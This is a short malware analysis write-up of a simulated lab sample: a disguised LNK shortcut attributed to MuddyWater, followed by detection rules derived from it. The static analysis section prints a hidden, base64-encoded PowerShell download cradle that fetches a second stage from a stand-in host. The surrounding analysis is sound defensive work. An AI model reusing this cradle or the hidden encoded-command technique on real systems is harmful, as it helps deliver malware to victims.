# Sample Analysis: MuddyWater PowerTon

**Sample SHA256**: `a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890` (SIMULATED)
**Filename**: `Invoice_Details.doc.lnk`
**Type**: LNK (Shortcut) -> PowerShell
**Source**: [SIMULATED LAB]

## Triage Summary

The sample masquerades as a document but is a LNK file. When executed, it launches `powershell.exe` with a hidden window to download a second stage payload from a compromised WordPress site.

## Static Analysis

* **Target**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **Arguments**: `-nop -w hidden -enc JAB3ADOAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwBvAG0AcAByAG8AbQBpAHMAZQBkAC0AcwBpAHQAZQAuAGMAbwBtAC8AYQBtAGkAbgAuAHAAaABwACIAKQA=`
* **Decoded Command**:

    ```powershell
    $w=new-object Net.WebClient;$w.DownloadString("http://compromised-site.com/amin.php")
    ```

## Behavioral Observations (Lab)

1. **Process Tree**: `explorer.exe` -> `powershell.exe` (Network Connection)
2. **Network**: HTTP GET request to `compromised-site.com` (User-Agent: Default PowerShell).
3. **File System**: No immediate file drop; payload executed in memory (Fileless).

## Detection Logic Derived

1. **YARA**: Detect the specific Base64 encoded string chunks in the LNK file.
2. **Sigma**: Detect PowerShell with `-w hidden -enc` or `Net.WebClient` usage.
3. **Network**: Detect the specific URL pattern or User-Agent if unique (Low fidelity, better to detect generic PS User-Agent to rare domains).
